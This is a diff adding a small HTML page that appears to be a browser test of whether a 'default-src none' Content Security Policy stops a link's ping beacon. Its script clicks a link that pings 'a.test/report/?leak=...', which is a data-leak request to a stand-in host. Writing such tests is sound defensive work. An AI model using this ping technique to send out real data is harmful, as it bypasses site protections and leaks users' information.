@@ -1,0 +1,9 @@
+<head>
+<meta http-equiv="content-security-policy" content="default-src 'none'; script-src 'unsafe-inline'">
+</head>
+<script>
+  a = document.createElement("a");
+  a.href = "#";
+  a.ping = "https://a.test/report/?leak=c661126";
+  a.click();
+</script>
